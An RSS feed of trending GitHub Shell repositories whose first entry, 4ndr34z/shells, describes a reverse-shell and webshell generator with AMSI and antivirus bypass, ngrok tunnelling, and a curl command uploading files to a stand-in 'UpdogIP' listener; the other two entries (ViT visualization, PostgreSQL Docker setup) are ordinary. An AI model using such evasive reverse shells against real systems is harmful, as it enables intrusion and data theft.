<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Shell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-12-18T01:38:38Z</updated>
  <subtitle>Daily Trending of Shell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>4ndr34z/shells</title>
    <updated>2022-12-18T01:38:38Z</updated>
    <id>tag:github.com,2022-12-18:/4ndr34z/shells</id>
    <link href="https://github.com/4ndr34z/shells" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Script for generating revshells&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;shells&lt;/h1&gt; &#xA;&lt;p&gt;A script for generating common revshells fast and easy. &lt;br&gt; Especially nice when in need of PowerShell and Python revshells, which can be a PITA getting correctly formated.&lt;br&gt;&lt;br&gt;&lt;/p&gt; &#xA;&lt;h2&gt;PowerShell revshells&lt;br&gt;&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Shows username@computer, above the prompt and working-directory&lt;/li&gt; &#xA; &lt;li&gt;Has a partial AMSI-bypass, making some stuff a bit easier&lt;/li&gt; &#xA; &lt;li&gt;TCP and UDP&lt;/li&gt; &#xA; &lt;li&gt;Windows Powershell and Core Powershell&lt;/li&gt; &#xA; &lt;li&gt;Functions for uploading and downloading files. (Using &lt;a href=&#34;https://github.com/sc0tfree/updog&#34;&gt;Updog&lt;/a&gt; by sc0tfree)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;ngrok support&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ngrok can be started/stopped from inside the script&lt;/li&gt; &#xA; &lt;li&gt;payloads will be genereated with the ngrok addresses&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Updog support&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;you can start/stop Updog from inside the script&lt;/li&gt; &#xA; &lt;li&gt;The PowerShell revshells have upload/download function embedded&lt;/li&gt; &#xA; &lt;li&gt;To upload from nix using curl: &lt;code&gt;curl -F path=&#34;absolute path for Updog-folder&#34; -F file=filename http://UpdogIP/upload&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;To install Shells&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/4ndr34z/shells&#xA;cd shells&#xA;./install.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Screenshots&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/macOS143.png?raw=true&#34; alt=&#34;Main&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/netcat1.png?raw=true&#34; alt=&#34;Netcat&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/pwsh.png?raw=true&#34; alt=&#34;pwsh&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/shells2.png?raw=true&#34; alt=&#34;screenshot3&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/shells3.png?raw=true&#34; alt=&#34;screenshot4&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/shells4.png?raw=true&#34; alt=&#34;screenshot5&#34;&gt; &lt;img src=&#34;https://github.com/4ndr34z/shells/raw/main/screenshots/SimpleRevshell.png?raw=true&#34; alt=&#34;screenshot6&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Youtube video&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/HDrzqiyKQtA&#34;&gt;Link&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Version 1.4.8&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sometimes less is more. Removed the obfuscating on TCP/UDP PowerShell revshells, because it actually triggers AV more than it bypasses and the payload got really big :-) Still using randomization.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.6&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added webshells (ASPX, PHP, JSP)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.5&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added 2 c++ revshell binaries for Windows 32 and 64 bit.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.4&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fixed the handling of starting/stopping Updog&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.3&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added Updog support&lt;/li&gt; &#xA; &lt;li&gt;Added Netcat binaries.&lt;/li&gt; &#xA; &lt;li&gt;Powershell: Created upload/download functionality (upload requires Updog for receiving files)&lt;/li&gt; &#xA; &lt;li&gt;Added more information about running ngrok and Updog.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.2&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell: Added a new &#34;mini AMSI-bypass&#34;. (It is a partial bypass) Based on Matt Graebers Reflection method&lt;/li&gt; &#xA; &lt;li&gt;PowerShell: Added a &#34;upload&#34; function in the Powershell reverseshell&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4.1&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Removed AMSI. Not tested enough :-)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.4&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added AMSI-bypass for the powershell payloads&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.9&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fixed bug when setting port&lt;/li&gt; &#xA; &lt;li&gt;Changed default port to 443&lt;/li&gt; &#xA; &lt;li&gt;PowerShell: obfuscated some more&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.8&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell: Minor changes to the UDP payload&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.7&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Using only native nc on macOS, because the one on homebrew doesn&#39;t work on incoming UDP&lt;/li&gt; &#xA; &lt;li&gt;PowerShell: Added UDP payloads&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.6&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell: Added more payloads&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.5&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell: Added some randomization and obfuscation for the payload&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.4&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell: Using UTF8 encoding in payload&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.3&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added Golang&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.2&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added OpenSSL&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3.1&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fixed bug in Python revshell&lt;/li&gt; &#xA; &lt;li&gt;Added awk&lt;/li&gt; &#xA; &lt;li&gt;Added Bash UDP&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.3&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added Windows Python revshells&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.9&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added a ngrok running-status&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.8&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hiding ngrok choice if not installed&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.7&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fixed the install options: not doing default option when pressing enter without making a choice&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.6&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added support for ngrok.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.4&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added a install-script&lt;/li&gt; &#xA; &lt;li&gt;Added install options for checking and installing missing dependencies&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.3&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added a couple of PHP shells&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.2&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added shells for: Ruby, Perl, Telnet and zsh&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2.1&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added copy to clipboard using pbcopy on macOS&lt;/li&gt; &#xA; &lt;li&gt;Added info about listening netcat as the macOS versions doesn&#39;t display that&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.2&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added looping netcat shells. Calls back every 10 seconds. Great in case you loose your shell&lt;/li&gt; &#xA; &lt;li&gt;Added check for netcat GNU netcat 0.7.0 Homebrew when running on macOS&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Version 1.1&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added support for macOS&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>hamidkazemi22/vit-visualization</title>
    <updated>2022-12-18T01:38:38Z</updated>
    <id>tag:github.com,2022-12-18:/hamidkazemi22/vit-visualization</id>
    <link href="https://github.com/hamidkazemi22/vit-visualization" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;What do Vision Transformers Learn? A Visual Exploration&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hamidkazemi22/vit-visualization/main/readme_images/1.png&#34; alt=&#34;Visualizations&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;ViT Models:&lt;/h3&gt; &#xA;&lt;p&gt;To visualize the features of the ViT models:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PYTHONPATH=. python experiments/it15/vis35.py -l &amp;lt;layer_number&amp;gt; -f &amp;lt;feature_number&amp;gt; -n  &amp;lt;network_number&amp;gt; -v &amp;lt;tv_coefficient&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PYTHONPATH=. python experiments/it15/vis35.py -l 4 -f 20 -n  35 -v 0.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Clip Models:&lt;/h3&gt; &#xA;&lt;p&gt;To visualize the features of the CLIP models:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PYTHONPATH=. python experiments/it15/vis98.py -l &amp;lt;layer_number&amp;gt; -f &amp;lt;feature_number&amp;gt; -n  &amp;lt;network_number&amp;gt; -v &amp;lt;tv_coefficient&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PYTHONPATH=. python experiments/it15/vis98.py -l 4 -f 20 -n  98 -v 0.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For the ViT models the -n option should be in [34, 35, 36, 37, 38, 39], and for the CLIP models the -n option should be in [94, 95, 96, 97, 98, 99]&lt;/p&gt; &#xA;&lt;p&gt;To list all the available network numbers use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python3&#34;&gt;python show_models.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here we list some of them:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;34: ViT0_B_16_imagenet1k&lt;/li&gt; &#xA; &lt;li&gt;35: ViT1_B_32_imagenet1k&lt;/li&gt; &#xA; &lt;li&gt;36: ViT2_L_16_imagenet1k&lt;/li&gt; &#xA; &lt;li&gt;37: ViT3_L_32_imagenet1k&lt;/li&gt; &#xA; &lt;li&gt;38: ViT4_B_16&lt;/li&gt; &#xA; &lt;li&gt;39: ViT5_B_32&lt;/li&gt; &#xA; &lt;li&gt;94: CLIP0_RN50&lt;/li&gt; &#xA; &lt;li&gt;95: CLIP1_RN101&lt;/li&gt; &#xA; &lt;li&gt;96: CLIP2_RN50x4&lt;/li&gt; &#xA; &lt;li&gt;97: CLIP3_RN50x16&lt;/li&gt; &#xA; &lt;li&gt;98: CLIP4_ViT-B/32&lt;/li&gt; &#xA; &lt;li&gt;99: CLIP5_ViT-B/16&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;We use the timm library to load the pretrained models. After running these commands, you can find the visualizations in the &lt;code&gt;desktop&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;p&gt;Other experiments done in the paper can be found in the &lt;code&gt;experiments&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;p&gt;For the experiments that we need to load the imagenet dataset like the isolating CLS experiment, the code assumes that the dataset is in data/imagenet/train for the training set, and data/imagenet/val for the validation set.&lt;/p&gt; &#xA;&lt;p&gt;We will update the readme with more instructions on how to run other experiments soon.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>mrts/docker-postgresql-multiple-databases</title>
    <updated>2022-12-18T01:38:38Z</updated>
    <id>tag:github.com,2022-12-18:/mrts/docker-postgresql-multiple-databases</id>
    <link href="https://github.com/mrts/docker-postgresql-multiple-databases" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Using multiple databases with the official PostgreSQL Docker image&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Using multiple databases with the official PostgreSQL Docker image&lt;/h1&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://hub.docker.com/_/postgres/&#34;&gt;official recommendation&lt;/a&gt; for creating multiple databases is as follows:&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;If you would like to do additional initialization in an image derived from this one, add one or more &lt;code&gt;*.sql&lt;/code&gt;, &lt;code&gt;*.sql.gz&lt;/code&gt;, or &lt;code&gt;*.sh&lt;/code&gt; scripts under &lt;code&gt;/docker-entrypoint-initdb.d&lt;/code&gt; (creating the directory if necessary). After the entrypoint calls &lt;code&gt;initdb&lt;/code&gt; to create the default &lt;code&gt;postgres&lt;/code&gt; user and database, it will run any &lt;code&gt;*.sql&lt;/code&gt; files and source any &lt;code&gt;*.sh&lt;/code&gt; scripts found in that directory to do further initialization before starting the service.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;This directory contains a script to create multiple databases using that mechanism.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;By mounting a volume&lt;/h3&gt; &#xA;&lt;p&gt;Clone the repository, mount its directory as a volume into &lt;code&gt;/docker-entrypoint-initdb.d&lt;/code&gt; and declare database names separated by commas in &lt;code&gt;POSTGRES_MULTIPLE_DATABASES&lt;/code&gt; environment variable as follows (&lt;code&gt;docker-compose&lt;/code&gt; syntax):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;myapp-postgresql:&#xA;    image: postgres:9.6.2&#xA;    volumes:&#xA;        - ../docker-postgresql-multiple-databases:/docker-entrypoint-initdb.d&#xA;    environment:&#xA;        - POSTGRES_MULTIPLE_DATABASES=db1,db2&#xA;        - POSTGRES_USER=myapp&#xA;        - POSTGRES_PASSWORD=&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;By building a custom image&lt;/h3&gt; &#xA;&lt;p&gt;Clone the repository, build and push the image to your Docker repository, for example for Google Private Repository do the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker build --tag=eu.gcr.io/your-project/postgres-multi-db .&#xA;gcloud docker -- push eu.gcr.io/your-project/postgres-multi-db&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You still need to pass the &lt;code&gt;POSTGRES_MULTIPLE_DATABASES&lt;/code&gt; environment variable to the container:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;myapp-postgresql:&#xA;    image: eu.gcr.io/your-project/postgres-multi-db&#xA;    environment:&#xA;        - POSTGRES_MULTIPLE_DATABASES=db1,db2&#xA;        - POSTGRES_USER=myapp&#xA;        - POSTGRES_PASSWORD=&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Non-standard database names&lt;/h3&gt; &#xA;&lt;p&gt;If you need to use non-standard database names (hyphens, uppercase letters etc), quote them in &lt;code&gt;POSTGRES_MULTIPLE_DATABASES&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;    environment:&#xA;        - POSTGRES_MULTIPLE_DATABASES=&#34;test-db-1&#34;,&#34;test-db-2&#34;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>